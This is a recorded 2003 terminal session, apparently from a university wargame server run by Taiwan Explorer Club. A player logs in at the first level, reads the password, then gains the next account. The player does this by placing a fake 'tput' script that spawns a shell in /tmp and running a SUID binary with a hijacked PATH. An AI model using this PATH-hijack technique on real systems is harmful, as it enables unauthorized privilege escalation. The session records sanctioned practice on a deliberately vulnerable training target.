@@ -1,0 +1,158 @@
+Script started on ¦è¤¸2003¦~05¤ë29¤é (¶g¥|) 03®É35¤À15¬í
+chihchun@chaos:~$ chihchun@chaos:~$ chihchun@chaos:~$ !chihchun@chaos:~$ !chihchun@chaos:~$ !tchihchun@chaos:~$ !tchihchun@chaos:~$ !techihchun@chaos:~$ !techihchun@chaos:~$ !telchihchun@chaos:~$ !telchihchun@chaos:~$ !telnchihchun@chaos:~$ !telnchihchun@chaos:~$ !telnechihchun@chaos:~$ !telnechihchun@chaos:~$ !telnetchihchun@chaos:~$ !telnet
+telnet OSs.Free-BSD.Org
+Trying 140.123.20.201...
+Connected to OSs.Free-BSD.Org.
+Escape character is '^]'.
+[2J
+[2;17H[0;1;37mWelcome to Moon CrapsServer 777E (UNIX)[0m
+[3;10H[33m +---------------------------------------------------+[0m
+[4;10H[33m |[0m     [1;31mWargame Station of Taiwan Explorer Club      [0;33m |[0m
+[5;10H[33m |[0m     [1;34mIP Addr. : 140.123.20.201                    [0;33m |[0m
+[6;10H[33m |[0m     [1;32mHostname : OSs.Free-BSD.Org                  [0;33m |[0m
+[7;10H[33m +---------------------------------------------------+[0m
+[9;4H[33m[1;35m_____________________________________________________________________[m
+[8;5H[0;36m 3:01AM  up 2 days,  3:04, 12 users, load averages: 1.70, 1.13, 0.92[0m[11;0H
+[11;6H[1mTEC Login: [0mbasic1
+[12;6H[1mPass word:[0m
+Last login: Thu May 29 03:01:18 from 61.70.194.51
+Copyright (c) 1980, 1983, 1986, 1988, 1990, 1991, 1993, 1994
+	The Regents of the University of California.  All rights reserved.
+
+[2J
+[2;18H[0;1;37mWelcome to Moon CrapsServer 777E (UNIX)[0m
+[3;11H[33m +---------------------------------------------------+[0m
+[4;11H[33m |[0m     [1;31mWargame Station of Taiwan Explorer Club      [0;33m |[0m
+[5;11H[33m |[0m     [1;34mIP Addr. : 140.123.20.201                    [0;33m |[0m
+[6;11H[33m |[0m     [1;32mHostname : OSs.Free-BSD.Org                  [0;33m |[0m
+[7;11H[33m +---------------------------------------------------+[0m
+[9;4H[33m[1;35m===================================================================[m
+[10;8HSince we invite you to come here...We hope you enjoy it.
+[11;8HWe consider you hackers have idiosyncrasy of a real guru.
+[12;8HSo you are allowed to do whatever you like on this server.
+[13;8HHowever, you still have to abide by the followings:
+[15;8H1. Making any DOS or DDOS attack to this machine is forbidden.
+[16;8H2. Attacking other machines from here is forbidden.
+[17;8H3. Keep the secrect of important passwords when you get root.
+[19;8HThe source code will be open to those who pass the puzzles.
+[20;8HLearn or expand your great knowledge of hacking happily here. :)
+[22;50HWargame SYSOP of TEC.[23;0H
+$ id
+uid=50001(basic1) gid=50001(basic1) groups=50001(basic1)
+$ ls
+HINT		Pa55w0rd	WWW		tmp
+$ cat HINT
+Welcome to TEC Wargame Site for CNA of National Chung Cheng University.
+
+For your Information, you can start from the next account's home.
+
+Hope you enjoy the wargame.
+
+With best regards,
+-- Arbro@TEC
+
+$ cat P*
+[2J[0;0H    __________		      _			       __
+  ."	      ".	  _.-(_)-._		   _.-{__}-._
+  | .--------. |	.'_________'.		 .:-'`____`'-:.
+ /` |________| `\      [_____________]		/_.-"`_	 _`"-._\
+|  / / .\/. \ \	 |     /  / .\/. \   \	       /`   / .\/. \   `\
+\_/  \__/\__/  \_/    |	  \__/\__/    |	      |	    \__/\__/	 |
+  \	       /       \	     /	     .-\		/-.
+  /'._	--  _.'\       /'._  --	 _.'\	    /	'._-.__--__.-_.'   \
+ /_   `""""`   _\     /_   `""""`   _\	   /`'.	   `""""""""`	 .'`\
+(_|	       |_)   (__/    '|	   \ _)	   |   |	'	|   |
+   \__________/	       |_____'|_____|	   '-;`_________'________`;-'
+   '----------'		'----------'	     `--------------------`
+     .--""--.
+   .'	     '.
+  /   .'``'.   \
+ |  .'/.\/.\'.	|
+ |  : \_/\_/ ;	|
+ \  '.\	   /.'	/
+  /'. `'--'` .'\	    _____
+ /_  `-./\.-'  _\	   /¡ó ¡ó\	    [1;30;47mDomain://CNA.CCu.Edu.Tw [0m
+(_/	       \_)	  ( _____ )         [1;34;43mHostFunc://WargameShell [0m
+|		|	.-|	  |-.       [1;36;45mIPAddr://140.123.20.201 [0m
+ '--------------'     __: _||___||_ ;__     [1;31;44mMembers: Hackers in TEC [0m
+[13;20H    ________________________________________________[14;20H   /                                                \[15;20H   |                                                |[16;20H   |                                                |[17;20H   \______  ________________________________________/[18;20H          \/[14;25HCongratulation!![15;25HYou've got SUID Permission of "basic1" !![16;25HPa55w0rd is : [1;36;41m Welcome! [0m[23;0H
+$ cd ~basic2
+$ ls
+Pa55w0rd	WWW		bin		code		tmp
+$ ls -al 
+total 11
+drwxr-x--x   6 basic2  basic1       512 May 23 03:41 .
+dr-xr-xr-x  11 root    wheel        512 May 23 03:46 ..
+-r--r-----   1 basic2  basic2       650 May 23 03:41 .cshrc
+-r--r-----   1 basic2  basic2       183 May 23 03:41 .muttrc
+crw-r--r--   1 basic2  basic2    2,   2 May 23 03:41 .viminfo
+-r--r-----   1 basic2  basic2       248 May 23 03:41 .vimrc
+-r--r-----   1 basic2  basic2      1543 May 23 03:41 Pa55w0rd
+dr-xr-x---   2 basic2  basic2       512 May 23 03:41 WWW
+dr-xr-x---   2 basic2  basic1       512 May 23 03:41 bin
+dr-xr-x---   2 basic2  basic1       512 May 23 03:41 code
+drwxrwx--T   2 basic2  basic1       512 May 29 02:20 tmp
+$ ls -al bin
+total 5
+dr-xr-x---  2 basic2  basic1   512 May 23 03:41 .
+drwxr-x--x  6 basic2  basic1   512 May 23 03:41 ..
+-r-sr-s---  1 basic2  basic1  2764 May 23 03:41 cls
+$ cd bin
+$ strings cls
+/usr/libexec/ld-elf.so.1
+FreeBSD
+libc.so.4
+_DYNAMIC
+system
+_init
+environ
+__deregister_frame_info
+__progname
+_fini
+atexit
+_GLOBAL_OFFSET_TABLE_
+__register_frame_info
+_edata
+__bss_start
+_end
+8/u	
+exec tput clear
+$ tput ?^C
+$ ls /tmp
+haha	id
+$ cat > /tmp/tput
+#!/bin/sh
+sh
+^D$ chmod 755 /tmp/tput
+$ env   PATH=/tmp:$PATH ./cls
+$ cat ../P*
+[2J[0;0H    __________		      _			       __
+  ."	      ".	  _.-(_)-._		   _.-{__}-._
+  | .--------. |	.'_________'.		 .:-'`____`'-:.
+ /` |________| `\      [_____________]		/_.-"`_	 _`"-._\
+|  / / .\/. \ \	 |     /  / .\/. \   \	       /`   / .\/. \   `\
+\_/  \__/\__/  \_/    |	  \__/\__/    |	      |	    \__/\__/	 |
+  \	       /       \	     /	     .-\		/-.
+  /'._	--  _.'\       /'._  --	 _.'\	    /	'._-.__--__.-_.'   \
+ /_   `""""`   _\     /_   `""""`   _\	   /`'.	   `""""""""`	 .'`\
+(_|	       |_)   (__/    '|	   \ _)	   |   |	'	|   |
+   \__________/	       |_____'|_____|	   '-;`_________'________`;-'
+   '----------'		'----------'	     `--------------------`
+     .--""--.
+   .'	     '.
+  /   .'``'.   \
+ |  .'/.\/.\'.	|
+ |  : \_/\_/ ;	|
+ \  '.\	   /.'	/
+  /'. `'--'` .'\	    _____
+ /_  `-./\.-'  _\	   /¡ó ¡ó\	    [1;30;47mDomain://CNA.CCu.Edu.Tw [0m
+(_/	       \_)	  ( _____ )         [1;34;43mHostFunc://WargameShell [0m
+|		|	.-|	  |-.       [1;36;45mIPAddr://140.123.20.201 [0m
+ '--------------'     __: _||___||_ ;__     [1;31;44mMembers: Hackers in TEC [0m
+[13;20H    ________________________________________________[14;20H   /                                                \[15;20H   |                                                |[16;20H   |                                                |[17;20H   \______  ________________________________________/[18;20H          \/[14;25HCongratulation!![15;25HYou've got SUID Permission of "basic2" !![16;25HPa55w0rd is : [1;36;41m Happy and Enjoy [0m[23;0H
+$ rm -fv /tmp/tput
+rm: /tmp/tput: Operation not permitted
+$ ls -a     ^D$ rm /tmp    -f /tmp/tput
+$ ^DConnection closed by foreign host.
+chihchun@chaos:~$ chihchun@chaos:~$ 
+Script done on ¦è¤¸2003¦~05¤ë29¤é (¶g¥|) 03®É36¤À40¬í
